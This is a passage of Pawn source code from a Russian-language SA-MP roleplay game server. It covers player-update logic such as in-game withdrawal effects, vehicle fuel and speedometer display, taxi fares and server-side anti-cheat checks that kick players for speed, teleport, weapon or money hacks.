    		//	PlayerTextDrawSetString(playerid,EXITTEXT[playerid], string);
		        DeletePVar(playerid,"Drift");
		        DeletePVar(playerid,"DriftTimer");
		    }
		}
    }
    if(PlayerInfo[playerid][pLomka] < gettime() && PlayerInfo[playerid][pLomka] != 0 && PlayerInfo[playerid][pZavisimost] > 50 && !GetPVarInt(playerid,"Lomka"))
    {
        if(!GetPVarInt(playerid,"InDrift") && !Trenag[playerid] && !GetPVarInt(playerid,"Tir") && !GetPVarInt(playerid,"KomGG"))
        {
            SendClientMessage(playerid,CGREEN,"У Вас началась ломка!");
            SendClientMessage(playerid,CGREEN,"Принять дозу: /usedrugs | Вызвать скорую: /call 911");
            ApplyAnimation(playerid, "CRACK", "crckdeth1", 4.0, 1, 0, 0, 0, 0);
            SetPVarInt(playerid,"AntiSbiv",1);
			SetPVarInt(playerid,"Sbiv",gettime() + 60*(PlayerInfo[playerid][pZavisimost]/10-4));
			new timer = SetTimerEx("LomkaOff",60000*(PlayerInfo[playerid][pZavisimost]/10-4),false,"d",playerid);
			SetPVarInt(playerid,"Lomka",timer+1);

        }
		if(PlayerInfo[playerid][pZavisimost] > 50 && PlayerInfo[playerid][pZavisimost] < 70) PlayerInfo[playerid][pLomka] = gettime()+60*60;
		if(PlayerInfo[playerid][pZavisimost] > 70 && PlayerInfo[playerid][pZavisimost] < 80) PlayerInfo[playerid][pLomka] = gettime()+60*50;
		if(PlayerInfo[playerid][pZavisimost] > 90 && PlayerInfo[playerid][pZavisimost] < 90) PlayerInfo[playerid][pLomka] = gettime()+60*40;
		if(PlayerInfo[playerid][pZavisimost] == 100) PlayerInfo[playerid][pLomka] = gettime()+60*30;
    }
    if(GetPVarInt(playerid,"Spec") > 0 && !IsPlayerConnected(GetPVarInt(playerid,"SpecID")) )
    {
		cmd_spoff(playerid);
    }

	if(GetPVarInt(playerid,"Spec") > 0)
	{
		new i = GetPVarInt(playerid,"SpecID"),Float:armh[2],car[30],str[70],Float:carhp,carspeed,pedspeed,shot,tshoot;
		GetPlayerHealth(i,armh[0]);
	    GetPlayerArmour(i,armh[1]);
	    new veh = GetPlayerVehicleID(i);
	    if(veh == INVALID_VEHICLE_ID) car = "~r~ENGINE: OFF";
		else
		{
		    GetVehicleHealth(veh,carhp);
		    carspeed = GetVehicleSpeed(veh) / 2;
		    pedspeed = GetPlayerSpeed(i) / 2;
			if(!Engine[veh]) car = "~r~ENGINE: OFF";
			else car = "~g~ENGINE: ON";
		}
		format(str,sizeof(str),"%s~n~%d~n~%d~n~%d~n~%d~n~%d",PlayerInfo[i][pSendername],GetPlayerPing(i),PlayerInfo[i][pLevel],pedspeed,floatround(armh[0]),floatround(armh[1]));
		PlayerTextDrawSetString(playerid,AdminPanelP[0][playerid],str);
		format(str,sizeof(str),"%s~n~%d~n~%d~n~%d~n~%d~n~%d",floatround(carhp),carspeed,GetPlayerAmmo(i),shot,tshoot,(GetPVarInt(playerid,"AFK")) ? (GetPVarInt(playerid,"AFK_Time")) : (0));
        PlayerTextDrawSetString(playerid,AdminPanelP[2][playerid],str);
        PlayerTextDrawSetString(playerid,AdminPanelP[1][playerid],car);
	 /*   new str[150],Float:armh[2],weapons, ammo,gunname[32],str2[40];
	    GetPlayerHealth(GetPVarInt(playerid,"SpecID"),armh[0]);
	    GetPlayerArmour(GetPVarInt(playerid,"SpecID"),armh[1]);
	    GetPlayerWeaponData(GetPVarInt(playerid,"SpecID"), 0, weapons, ammo);
		if(weapons != 0)
		{
		    GetWeaponName(weapons,gunname,32);
		    format(str2,sizeof(str2),"%s (%i)",gunname,ammo);
		}
		else format(str2,sizeof(str2),"None");
		format(str, sizeof(str),"NAME: ~r~%s~w~~n~LEVEL:~r~ %i~w~~n~MONEY:~r~ %i$~w~~n~HEAL:~r~ %.1f~w~~n~ARMOUR:~r~ %.1f~n~~w~GUN:~r~ %s",PlayerInfo[GetPVarInt(playerid,"SpecID")][pSendername],PlayerInfo[GetPVarInt(playerid,"SpecID")][pLevel],
		PlayerInfo[GetPVarInt(playerid,"SpecID")][pCash],armh[0],armh[1],str2);
        PlayerTextDrawSetString(playerid,SpecText[playerid],str);*/
	}
	if(GetPlayerState(playerid) == 2 && GetPVarInt(playerid,"UnLic") > 0 && GetPlayerDrunkLevel(playerid) < 10000) SetPlayerDrunkLevel(playerid,15000);
	if(GetPVarInt(playerid,"AntiFlood5") < gettime() && GetPVarInt(playerid,"CheckBan") > 0) DeletePVar(playerid,"BanRes"),DeletePVar(playerid,"CheckBan");
    if(GetPlayerState(playerid) == 2)
	{
	
	    if(!IsInv(GetPlayerVehicleID(playerid)))
		{
		    new carid = GetPlayerVehicleID(playerid);
		    if(GetVehicleModel(carid) == 574 && GetPVarInt(playerid,"SpeedLimit"))
		    {
				new Float:pos[3];
				GetVehicleVelocity(carid,pos[0],pos[1],pos[2]);
				new Float:speed = floatsqroot(floatadd(floatadd(floatpower(pos[0], 2), floatpower(pos[1], 2)),  floatpower(pos[2], 2))) * 100.3;
				if(speed > 10)
				{
				    new Float:dif = 10 / speed;
				    SetVehicleVelocity(carid,pos[0]*dif,pos[1]*dif,pos[2]);
				    speed = 10;
				}
			}
			new str[20];
			format(str,sizeof(str),"%i",GetVehicleSpeed(carid) / 2);
			PlayerTextDrawSetString(playerid,SpeedometrP[1][playerid],str);
			new Float:hl;
			GetVehicleHealth(carid,hl);
		 	format(str,sizeof(str),"%d%",floatround(hl)/10);
		 	PlayerTextDrawSetString(playerid,SpeedometrP[4][playerid],str);
		 	format(str,sizeof(str),"%05d_km",0);
		 	PlayerTextDrawSetString(playerid,SpeedometrP[5][playerid],str);
		 	format(str,sizeof(str),"%dL",Fuel[carid]);
		 	PlayerTextDrawSetString(playerid,SpeedometrP[6][playerid],str);
		/*	new str[5];
			
			format(str,sizeof(str),"%i",GetVehicleSpeed(carid) / 2);
			PlayerTextDrawSetString(playerid,_rsPTD[playerid][1],str);
			new strft[20];
			switch(Fuel[carid]/10)
			{
			    case 0: strft = "~w~----------";
			    case 1: strft = "~y~-~w~---------";
			    case 2: strft = "~y~--~w~--------";
			    case 3: strft = "~y~----~w~------";
			    case 4: strft = "~y~----~w~------";
			    case 5: strft = "~y~-----~w~-----";
			    case 6: strft = "~y~------~w~----";
			    case 7: strft = "~y~-------~w~---";
			    case 8: strft = "~y~--------~w~--";
			    case 9: strft = "~y~---------~w~-";
			    case 10: strft = "~y~----------";
			}
			PlayerTextDrawSetString(playerid,_rsPTD[playerid][3],strft);
			new strhl[20],Float:hl;
		 	GetVehicleHealth(carid,hl);
		 	format(strhl,sizeof(strhl),"HEAL: %d%",floatround(hl)/10);
		 	PlayerTextDrawSetString(playerid,_rsPTD[playerid][6],strhl);
		 	static const fmt_str4[] = "%sengine %slights %s";
			new string4[sizeof(fmt_str4)+6+10];
			format(string4, sizeof(string4), fmt_str4, (!Engine[carid]) ? ("~r~"):("~g~"), (!Lights[carid]) ? ("~r~"):("~g~"), (!IsLocked[carid]) ? ("~g~open"):("~r~locked"));
			PlayerTextDrawSetString(playerid,_rsPTD[playerid][4],string4);*/
		 	
		}
		if(GetPlayerDistanceFromPoint(playerid, carpos[playerid][0],carpos[playerid][1],carpos[playerid][2]) >= 500.0 && !IsABoat(GetPlayerVehicleID(playerid)) && !IsAPlane(GetPlayerVehicleID(playerid)) && !IsInv(GetPlayerVehicleID(playerid)) && Engine[GetPlayerVehicleID(playerid)] == true)
		{
		    if(IsAPlane(GetPlayerVehicleID(playerid)) || IsABoat(GetPlayerVehicleID(playerid)) || GetVehicleModel(GetPlayerVehicleID(playerid)) == 462) return 1;
		    for(new i = 1; i <= TOTALV; i++)
			{
			    if(VInfo[i][vcar] == INVALID_VEHICLE_ID) continue;
				if(GetPlayerVehicleID(playerid) == VInfo[i][vcar]) VInfo[i][vprob]++;
			}
			Fuel[GetPlayerVehicleID(playerid)]--;
			if(Fuel[GetPlayerVehicleID(playerid)] < 0) Fuel[GetPlayerVehicleID(playerid)] = 0;
			GetVehiclePos(GetPlayerVehicleID(playerid),carpos[playerid][0],carpos[playerid][1],carpos[playerid][2]);
		}
		new Float:health;
		GetVehicleHealth(GetPlayerVehicleID(playerid),health);
		if(health < 300 && Engine[GetPlayerVehicleID(playerid)] == true && !IsInv(GetPlayerVehicleID(playerid)))
		{
			if(!GetPVarInt(playerid,"InDrift")) SendClientMessage(playerid, CGREY, "Двигатель заглох, вызовите механика /call 911");
			SetEngine(playerid,GetPlayerVehicleID(playerid),false);
			SetLights(playerid,GetPlayerVehicleID(playerid),false);
		//	GetVehicleParamsEx(GetPlayerVehicleID(playerid),engine,lights,alarm,doors,bonnet,boot,objective);
		//	SetVehicleParamsEx(GetPlayerVehicleID(playerid),VEHICLE_PARAMS_OFF,VEHICLE_PARAMS_OFF,alarm,doors,bonnet,boot,objective);
		}
		if(health <= 250) SetVehicleHealth(GetPlayerVehicleID(playerid),299);
		if(Fuel[GetPlayerVehicleID(playerid)] <= 0 && Engine[GetPlayerVehicleID(playerid)] == true && GetVehicleModel(GetPlayerVehicleID(playerid)) != 481)
		{
			SendClientMessage(playerid,CGREY,"В транспорте закончился бензин");
			SetEngine(playerid,GetPlayerVehicleID(playerid),false);
			SetLights(playerid,GetPlayerVehicleID(playerid),false);
			GetVehicleParamsEx(GetPlayerVehicleID(playerid),engine,lights,alarm,doors,bonnet,boot,objective);
			SetVehicleParamsEx(GetPlayerVehicleID(playerid),VEHICLE_PARAMS_OFF,VEHICLE_PARAMS_OFF,alarm,doors,bonnet,boot,objective);
		}
	}
    new Float:x,Float:y,Float:z;
    GetPlayerPos(playerid,x,y,z);
    if(GetPlayerState(playerid) == PLAYER_STATE_PASSENGER) if(GetPlayerWeapon(playerid) == 24) SetPlayerArmedWeapon(playerid,0);
    //GetVehicleSpeed(GetPlayerVehicleID(playerid)) / 2
    new carid = GetPlayerSurfingVehicleID(playerid); 
    if(carid != INVALID_VEHICLE_ID ) 
    {
        if(!IsABoat(carid) && GetVehicleModel(carid) != 422 && GetVehicleModel(carid) != 455 && GetVehicleModel(carid) != 478 &&
        GetVehicleModel(carid) != 543 && GetVehicleModel(carid) != 554 && GetVehicleModel(carid) != 578 && GetVehicleModel(carid) != 600)
        {
            if(GetVehicleSpeed(carid) / 2 > 30)
            {
	            new Float:slx, Float:sly, Float:slz;
	            GetPlayerPos(playerid, slx, sly, slz);
	            SetPlayerPos(playerid, slx, sly, slz+2.5);
	            ApplyAnimation(playerid, "ped", "BIKE_fallR", 4.0, 0, 1, 0, 0, 0,0);
	            new Float:hp;
	            GetPlayerHealth(playerid, hp);
	            SetHealth(playerid, hp-15);
	            SetTimerEx("anim2", 1100, 0, "d", playerid);
            }
        }
    }
    if(GetPlayerState(playerid) == 2 || GetPlayerState(playerid) == 3)
	{
	    new Float: MaxVehicleSpeed[] =
		{
			160.00, 160.00, 200.00, 120.00, 150.00, 165.00, 110.00, 170.00, 110.00, 180.00, 160.00,
			240.00, 160.00, 160.00, 140.00, 230.00, 155.00, 200.00, 150.00, 160.00, 180.00, 180.00,
			165.00, 145.00, 170.00, 200.00, 200.00, 170.00, 170.00, 200.00, 190.00, 130.00, 80.000,
			180.00, 200.00, 120.00, 160.00, 160.00, 160.00, 160.00, 160.00, 75.000, 150.00, 150.00,
			110.00, 165.00, 190.00, 200.00, 190.00, 150.00, 120.00, 240.00, 190.00, 190.00, 190.00,
			140.00, 160.00, 160.00, 165.00, 160.00, 200.00, 190.00, 260.00, 190.00, 75.000, 75.000,
			160.00, 160.00, 190.00, 200.00, 170.00, 160.00, 190.00, 190.00, 160.00, 160.00, 200.00,
			200.00, 150.00, 165.00, 200.00, 120.00, 150.00, 120.00, 190.00, 160.00, 100.00, 200.00,
			200.00, 170.00, 170.00, 160.00, 160.00, 190.00, 220.00, 170.00, 200.00, 200.00, 140.00,
			140.00, 160.00, 75.000, 260.00, 260.00, 160.00, 260.00, 230.00, 165.00, 140.00, 120.00,
			140.00, 200.00, 200.00, 200.00, 120.00, 120.00, 165.00, 165.00, 160.00, 340.00, 340.00,
			190.00, 190.00, 190.00, 110.00, 160.00, 160.00, 160.00, 170.00, 160.00, 60.000, 70.000,
			140.00, 200.00, 160.00, 160.00, 160.00, 110.00, 110.00, 150.00, 160.00, 230.00, 160.00,
			165.00, 260.00, 160.00, 160.00, 160.00, 200.00, 160.00, 160.00, 165.00, 160.00, 200.00,
			170.00, 180.00, 110.00, 110.00, 200.00, 200.00, 200.00, 200.00, 200.00, 200.00, 75.000,
			200.00, 160.00, 160.00, 170.00, 110.00, 110.00, 90.000, 60.000, 110.00, 60.000, 160.00,
			160.00, 200.00, 110.00, 160.00, 165.00, 190.00, 160.00, 170.00, 120.00, 165.00, 260.00,
			200.00, 140.00, 200.00, 260.00, 120.00, 200.00, 200.00, 60.000, 190.00, 200.00, 200.00,
			200.00, 160.00, 165.00, 110.00, 200.00, 200.00, 260.00, 260.00, 160.00, 160.00, 160.00,
			140.00, 160.00, 260.00
		};
		new vehicleid = GetPlayerVehicleID(playerid);
		if((GetVehicleSpeed(vehicleid) > (MaxVehicleSpeed[(GetVehicleModel(vehicleid) - 400)] + 15.0)))
		{
			AddCheater(playerid);
		}
	}
	new Float:_x,Float:_y,Float:_z;
    GetPlayerPos(playerid, _x, _y, _z);
    new Float:_z1;
	GetPlayerVelocity(playerid,_z1,_z1,_z1);
	if((GetPlayerAnimationIndex(playerid) == 1538
	|| GetPlayerAnimationIndex(playerid) == 1539
	|| GetPlayerAnimationIndex(playerid) == 1543)
	&& (floatround(floatsqroot(_x*_x+_y*_y+_z*_z)*170.0) > 10 && _z1 > 2))
    {
        if((!IsPlayerInRangeOfPoint(playerid, 20.0, 1968.3948,-1198.0753,17.4500))
	  	&&(!IsPlayerInRangeOfPoint(playerid, 20.0, 2310.9861,-1412.8881,21.6151))
	   	&&(!IsPlayerInRangeOfPoint(playerid, 20.0, 1241.1094,-2379.7263,8.3145))
	    &&(!IsPlayerInRangeOfPoint(playerid, 20.0, 225.6394,-1187.0551,73.4500))
	    &&(!IsPlayerInRangeOfPoint(playerid, 20.0, 193.2040,-1224.7693,76.5034))
	    &&(!IsPlayerInRangeOfPoint(playerid, 20.0, 196.0067,-1232.3684,76.5034))
	    &&(!IsPlayerInRangeOfPoint(playerid, 20.0, 512.7349,-1104.1942,78.8238))
	    &&(!IsPlayerInRangeOfPoint(playerid, 20.0, 1283.7939,-806.5845,86.1230))
	    &&(!IsPlayerInRangeOfPoint(playerid, 20.0, 2531.6001,1568.4032,8.4171))
	    &&(!IsPlayerInRangeOfPoint(playerid, 60.0, 2105.2651,1916.6781,9.5989))
		&&(!IsPlayerInRangeOfPoint(playerid, 150.0,-792.4582,2173.0356,40.0821))
	    &&(!IsPlayerInRangeOfPoint(playerid, 150.0,1993.5868,1601.2623,9.2979)))
	    {
		    AddCheater(playerid);
	    }
    }
    if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	{
		new Float:VehicleHealth;
		GetVehicleHealth(GetPlayerVehicleID(playerid), VehicleHealth);
		if(VehicleHealth > ServerHPVehicle[GetPlayerVehicleID(playerid)] && GetTickCount() > car__ignore_tick[GetPlayerVehicleID(playerid)])
		{
			SetVehicleHealth(GetPlayerVehicleID(playerid), ServerHPVehicle[GetPlayerVehicleID(playerid)]);
			//SetPVarInt(playerid,"KickHealth",GetPVarInt(playerid,"KickHealth")+1);
			//if(GetPVarInt(playerid,"KickHealth") > 9 && GetPVarInt(playerid,"Cheat") == 0) SaveAccount(playerid),CheatKick(playerid,11);
		}
		else ServerHPVehicle[GetPlayerVehicleID(playerid)] = VehicleHealth;
	}
    if(GetPVarInt(playerid,"AntiSbiv") > 0) if(GetPVarInt(playerid,"Sbiv") < gettime()) DeletePVar(playerid,"AntiSbiv");

/*    if((GetPlayerState(playerid) == PLAYER_STATE_SPECTATING)
	&&(PlayerInfo[playerid][pAdmin] == 0) && (GetPVarInt(playerid,"Cheat") == 0)) SaveAccount(playerid),CheatKick(playerid,12);*/
    if(GetPVarInt(playerid,"Taxi") > 0 && GetPVarInt(GetPVarInt(playerid,"TaxiID"),"KM") > 0)
    {
        if(GetPlayerDistanceFromPoint(playerid, taxipos[playerid][0],taxipos[playerid][1],taxipos[playerid][2]) >= 500.0)
		{
		    if(PlayerInfo[playerid][pCash] < GetPVarInt(GetPVarInt(playerid,"TaxiID"),"MarTaxi"))
			{
			    RemovePlayerFromVehicle(playerid);
			    SendClientMessage(playerid,CGREY,"Недостаточно средств");
			    DeletePVar(playerid,"Taxi");
			    DeletePVar(playerid,"TaxiID");
			}
			else
			{
			    GiveMoney(playerid,-GetPVarInt(GetPVarInt(playerid,"TaxiID"),"MarTaxi"));
				GiveMoney(GetPVarInt(playerid,"TaxiID"),GetPVarInt(GetPVarInt(playerid,"TaxiID"),"MarTaxi"));
            	GetVehiclePos(GetPlayerVehicleID(playerid),taxipos[playerid][0],taxipos[playerid][1],taxipos[playerid][2]);
            }
		}
    }
   	new Float:x_coords, Float:y_coords, Float:z_coords;
	GetPlayerVelocity(playerid,x_coords,y_coords,z_coords);
	if(x_coords >= 2.0 || y_coords >= 2.0)
	{
		if(PlayerInfo[playerid][pAdmin] == 0 && GetPVarInt(playerid,"Cheat") == 0)
		{
			SetPVarInt(playerid, "Pizdorvanka", GetPVarInt(playerid, "Pizdorvanka") + 1);
			if(GetPVarInt(playerid, "Pizdorvanka") >= 3) SaveAccount(playerid),CheatKick(playerid,2);
		}
	}
	if(GetPVarInt(playerid,"CarID") == botcar) RemovePlayerFromVehicle(playerid);
   	if((IsPlayerInAnyVehicle(playerid))
	&&(GetPlayerVehicleID(playerid) != GetPVarInt(playerid,"CarID")) && (GetPVarInt(playerid,"Cheat") == 0) && !GetPVarInt(playerid,"InDrift"))
	{
		SaveAccount(playerid),CheatKick(playerid,3);
		RemovePlayerFromVehicle(playerid);
	}
	if((GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_USEJETPACK)
	&&(PlayerInfo[playerid][pAdmin] == 0) && PlayerLogged[playerid] == true) Kick(playerid, FIX_FUNCTION, 1200);
	//if(GetPlayerSurfingVehicleID(playerid) != INVALID_VEHICLE_ID) tp__ignore_tick[playerid] = GetTickCount() + TP__IGNORE_TIME;
	if((GetTickCount() > tp__ignore_tick[playerid]) && GetPlayerSurfingVehicleID(playerid) == INVALID_VEHICLE_ID && !PlayerInfo[playerid][pAdmin] )
    {
        if(GetPlayerDistanceFromPoint(playerid, player__pos[0][playerid],player__pos[1][playerid],player__pos[2][playerid]) > 10.0 && GetPlayerAnimationIndex(playerid) == 1189)
        {
			AddCheater(playerid);
        }
    }
	if(!GetPVarInt(playerid,"SpecBool") && GetPlayerSurfingVehicleID(playerid) == INVALID_VEHICLE_ID && !PlayerInfo[playerid][pAdmin] && !GetPVarInt(playerid,"Cheat"))
	{
	    if(GetPlayerAnimationIndex(playerid))
    	{
	        new animlib[32],animname[32];
	        GetAnimationName(GetPlayerAnimationIndex(playerid),animlib,32,animname,32);
	        if(strcmp(animname, "CAR_SIT_PRO", true) == 0 && strcmp(animlib, "PED", true) == 0 && !IsPlayerInAnyVehicle(playerid)) SaveAccount(playerid),CheatKick(playerid,4);
        }
		new Float:Distance = GetPlayerDistanceFromPoint(playerid, player__pos[0][playerid], player__pos[1][playerid], player__pos[2][playerid]);
		if(!IsPlayerInAnyVehicle(playerid))
		{
		    new Float:Velocity[3];
			GetPlayerVelocity(playerid, Velocity[0], Velocity[1], Velocity[2]);
		    if((GetTickCount() > tp__ignore_tick[playerid]) && Distance > 10 && Velocity[0] == 0.0 && Velocity[1] == 0.0 && Velocity[2] == 0.0)
		    {
/*		        			if(x 1678.6046,1448.5035,10.7750,276.8253, -1, -1, -1, -1, -1, -1);
			case 0: SetSpawnInfo(playerid, 255, PlayerInfo[playerid][pModel], 2845.8662,1291.0157,11.3906,90.0034, -1, -1, -1, -1, -1, -1);
			case 2: SetSpawnInfo(playerid, 255, PlayerInfo[playerid][pModel], 2222.8694,1839.0148,10.8203,89.8207, -1, -1, -1, -1, -1, -1);*/
		        new animlib[32],animname[32];
		        GetAnimationName(GetPlayerAnimationIndex(playerid),animlib,32,animname,32);
	            if(strcmp(animlib,"PARACHUTE",true))
				{
					SaveAccount(playerid);
  					CheatKick(playerid,5);
					new Float:x2,Float:y2,Float:z2;
					GetPlayerPos(playerid,x2,y2,z2);
					static const fmt_str4[] = "Информация: iPos: %.1f,%.1f,%.1f | Pos: %.1f,%.1f,%.1f | Ignore: %i";
					new string4[sizeof(fmt_str4)+30];
					format(string4, sizeof(string4), fmt_str4, player__pos[0][playerid],player__pos[1][playerid],player__pos[2][playerid],x2,y2,z2,tp__ignore_tick[playerid]-GetTickCount());
					SendClientMessage(playerid,CLIGHTRED,string4);
				}
    		}
		    if((GetTickCount() > tp__ignore_tick[playerid]) &&  (Velocity[0] > 0.7 || Velocity[1] > 0.7 || Velocity[1] < -0.7 || Velocity[0] < -0.7))
		    {
		        SaveAccount(playerid),CheatKick(playerid,6);
		    }
		}
		else
		{
		    new Float:Velocity[3];
			GetVehicleVelocity(GetPlayerVehicleID(playerid), Velocity[0], Velocity[1], Velocity[2]);
			if(GetTickCount() > tp__ignore_tick[playerid] && Distance > 10 && Velocity[0] == 0.0 && Velocity[1] == 0.0 && Velocity[2] == 0.0)
		    {
	            SaveAccount(playerid),CheatKick(playerid,7);
		    }
		    if((GetTickCount() > tp__ignore_tick[playerid]) &&  Velocity[0] > 1.4 || Velocity[1] > 1.4 || Velocity[1] < -1.4 || Velocity[0] < -1.4)
		    {
		        SaveAccount(playerid),CheatKick(playerid,8);
		    }
		}
	}
    GetPlayerPos(playerid, player__pos[0][playerid], player__pos[1][playerid], player__pos[2][playerid]);
    if((GetPlayerWeapon(playerid) != GunInfo[playerid][pWeapon][Slot(GetPlayerWeapon(playerid))])
	&&(GetTickCount() > gun__ignore_tick[playerid])
	&& (GetPVarInt(playerid,"Cheat") == 0))
	{
		SaveAccount(playerid),CheatKick(playerid,9);
		static const fmt_str4[] = "Информация: GunID: %d Slot: %d | GunID: %d Slot: %d | Ignore: %i";
		new string4[sizeof(fmt_str4)+30];
		format(string4, sizeof(string4), fmt_str4, GetPlayerWeapon(playerid),Slot(GetPlayerWeapon(playerid)),GunInfo[playerid][pWeapon][Slot(GetPlayerWeapon(playerid))],Slot(GetPlayerWeapon(playerid)),gun__ignore_tick[playerid]-GetTickCount());
		SendClientMessage(playerid,CLIGHTRED,string4);
	}
	switch(GetPlayerWeapon(playerid))
    {
        case 16..39,41..43:
		{
		    new weapon,ammo;
		    GetPlayerWeaponData(playerid, Slot(GetPlayerWeapon(playerid)), weapon, ammo);
		    if((GunInfo[playerid][pAmmo][Slot(weapon)]+9 < ammo)
			&& (GetTickCount() > gun__ignore_tick[playerid])
			&& (GetPVarInt(playerid,"Cheat") == 0))
			{
				SaveAccount(playerid),CheatKick(playerid,10);
				ResetPlayerWeapons(playerid);
			}
		}
    }
    if(PlayerInfo[playerid][pCash] != GetPlayerMoney(playerid))
	{
		ResetPlayerMoney(playerid);
		GivePlayerMoney(playerid, PlayerInfo[playerid][pCash]);
	}
	new Float:health;
	GetPlayerHealth(playerid, health);
	if(floatround(health) > floatround(PlayerInfo[playerid][pHeal])) SetPlayerHealth(playerid,PlayerInfo[playerid][pHeal]);
	new Float:arm;
	GetPlayerArmour(playerid, arm);
	if(floatround(arm) > floatround(PlayerInfo[playerid][pArm])) SetPlayerArmour(playerid,PlayerInfo[playerid][pArm]);
	return 1;
}
stock Slot(const weapon)
{
	switch(weapon)
 	{
  		case 0,1: return 0;
  		case 2..9: return 1;
    	case 10..15: return 10;
     	case 16..18,39: return 8;
      	case 22..24: return 2;
       	case 25..27: return 3;
       	case 28,29,32: return 4;
       	case 30,31: return 5;
        case 33,34: return 6;
        case 35..38: return 7;
        case 40: return 12;
        case 41..43: return 9;
		case 44..46: return 11;
 	}
  	return -1;
}
stock ac__GetVehicleSpeed(vehicleid)
{
    new Float:x, Float:y, Float:z;
    GetVehicleVelocity(vehicleid, x, y, z);
    return floatround(floatsqroot(x*x+y*y+z*z)*100);
}


public OnTrailerUpdate(playerid, vehicleid)
{
    if(PlayerInfo[playerid][pJob] == 60 && GetPVarInt(playerid,"Mar") == 36)
	{
		if(vehicleid == Trailer[playerid] && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
		{
            new nap,str[50];
            new veh = GetPlayerVehicleID(playerid);
		    switch(GetVehicleModel(veh))
		    {
		        case 514: nap = 5;
		        case 403: nap = 10;
		        case 515: nap = 15;
		    }
			if(GetVehicleTrailer(veh) == Trailer[playerid] && GetPVarInt(playerid,"TimerDal"))
			{
			    KillTimer(GetPVarInt(playerid,"TimerDal"));
			    DeletePVar(playerid,"TimerDal");
			    format(str,sizeof(str),"Загружено: {f7ae11}%d/%d т.",TrailerKol[playerid],nap);
			    UpdateDynamic3DTextLabelText(CarLable[veh],-1,str);
			    DisablePlayerRaceCheckpoint(playerid),DeletePVar(playerid,"GPS");
			}
			
		}
	}
	return 1;
}
public OnUnoccupiedVehicleUpdate(vehicleid, playerid, passenger_seat, Float:new_x, Float:new_y, Float:new_z, Float:vel_x, Float:vel_y, Float:vel_z)
{
    if(PlayerInfo[playerid][pJob] == 60 && GetPVarInt(playerid,"Mar") == 36)
	{
	    if(vehicleid == Trailer[playerid] && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
		{
		    new nap,str[50];
	        new veh = GetPlayerVehicleID(playerid);
		    switch(GetVehicleModel(veh))
		    {
		        case 514: nap = 5;
		        case 403: nap = 10;
		        case 515: nap = 15;
		    }
		    if(GetVehicleTrailer(veh) != Trailer[playerid] && !GetPVarInt(playerid,"TimerDal"))
			{
			    SendClientMessage(playerid,CREWARD,"У Вас есть 30 секунд, чтобы забрать прицеп!");
			    SetPVarInt(playerid,"TimerDal",30);
			    //SetPVarInt(playerid,"TimerDal",SetTimerEx("DelTrailer",30000,false,"d",playerid));
			    format(str,sizeof(str),"Загружено: {f7ae11}0/%d т.",TrailerKol[playerid],nap);
			    UpdateDynamic3DTextLabelText(CarLable[veh],-1,str);
			}

		}

	}
/*    if(PlayerInfo[playerid][pJob] == 60 && GetPVarInt(playerid,"Mar") == 36)
	{
	    new nap,str[50];
	    switch(GetVehicleModel(vehicleid))
	    {
	        case 514: nap = 5;
	        case 403: nap = 10;
	        case 515: nap = 15;
	    }
		if(GetVehicleTrailer(vehicleid) == Trailer[playerid] && GetPVarInt(playerid,"TimerDal"))
		{
		    KillTimer(GetPVarInt(playerid,"TimerDal"));
		    DeletePVar(playerid,"TimerDal");
		    format(str,sizeof(str),"Загружено: {f7ae11}%d/%d т.",TrailerKol[playerid],nap);
		    UpdateDynamic3DTextLabelText(CarLable[vehicleid],-1,str);
		}
		if(GetVehicleTrailer(vehicleid) != Trailer[playerid] && !GetPVarInt(playerid,"TimerDal"))
		{
		    SendClientMessage(playerid,CREWARD,"У Вас есть 30 секунд, чтобы забрать прицеп!");
		    SetPVarInt(playerid,"TimerDal",SetTimerEx("DelTrailer",30000,false,"d",playerid));
		    format(str,sizeof(str),"Загружено: {f7ae11}0/%d т.",TrailerKol[playerid],nap);
		    UpdateDynamic3DTextLabelText(CarLable[vehicleid],-1,str);
		}
	}*/
    if(vehicleid == botcar)
	{
		new Float:Pos3[4];
		GetVehiclePos(vehicleid, Pos3[0], Pos3[1], Pos3[2]);
		GetVehicleZAngle(vehicleid, Pos3[3]);
		new Count2 = ac__GetFloatDifference(Pos3[0],veh__pos[vehicleid][0]);
		new Count3 = ac__GetFloatDifference(Pos3[1],veh__pos[vehicleid][1]);
		if(Count2 > 2 || Count3 > 2) SetVehicleToRespawn(botcar);
	}
	if(passenger_seat > 0)
	{
        new Float:x, Float:y, Float:z, Float:x2, Float:y2, Float:z2;
        GetVehiclePos(vehicleid, x2, y2, z2);
        GetVehicleVelocity(vehicleid, x, y, z);
        if(ac__GetFloatDifference(x2,veh__pos[vehicleid][0]) > 35.0 &&
        ac__GetFloatDifference(z2,veh__pos[vehicleid][2]) < 5.0 ||
        ac__GetFloatDifference(y2,veh__pos[vehicleid][1]) > 35.0 &&
        ac__GetFloatDifference(z2,veh__pos[vehicleid][2]) < 5.0)
        {
            veh__pos[vehicleid][0] = x;
            veh__pos[vehicleid][1] = y;
            veh__pos[vehicleid][2] = z;
            if(ac__GetVehicleSpeed(vehicleid) > 20.0)
            {
                SetVehicleToRespawn(vehicleid),AddCheater(playerid);
            }
            switch(ac__carshot_check[playerid])
            {
                    case 29..60: AddCheater(playerid);
            }
            ac__carshot_check[playerid]++;
        }
        if(x == 0 && y == 0)
        {
            if(ac__GetVehicleSpeed(vehicleid) > 20.0)
            {
                SetVehicleToRespawn(vehicleid),AddCheater(playerid);
            }
            switch(ac__carshot_check[playerid])
            {
                case 29..60: SetVehicleToRespawn(vehicleid),AddCheater(playerid);
            }
            ac__carshot_check[playerid]++;
        }
	}
	else
	{
	    new Float:Pos[4];
	    GetVehiclePos(vehicleid, Pos[0], Pos[1], Pos[2]);
	    GetVehicleZAngle(vehicleid, Pos[3]);
	    new Count0 = ac__GetFloatDifference(Pos[0],veh__pos[vehicleid][0]);
	    new Count1 = ac__GetFloatDifference(Pos[1],veh__pos[vehicleid][1]);
	    switch(GetVehicleModel(vehicleid))
	    {
	        case 435, 450, 584, 591, 606..608, 610, 611,581,522,521,523,586,448,461,463,468,471: return 1;
			default:
			{
			    if((Count0 > 5 || Count1 > 5)
				&&(tp__ignore_tick[playerid] < GetTickCount()))
			    {
			        SetVehiclePos(vehicleid, veh__pos[vehicleid][0], veh__pos[vehicleid][1], veh__pos[vehicleid][2]);
	        		SetVehicleZAngle(vehicleid, veh__pos[vehicleid][3]);
	        		AddCheater(playerid);
			    }
			    else
			    {
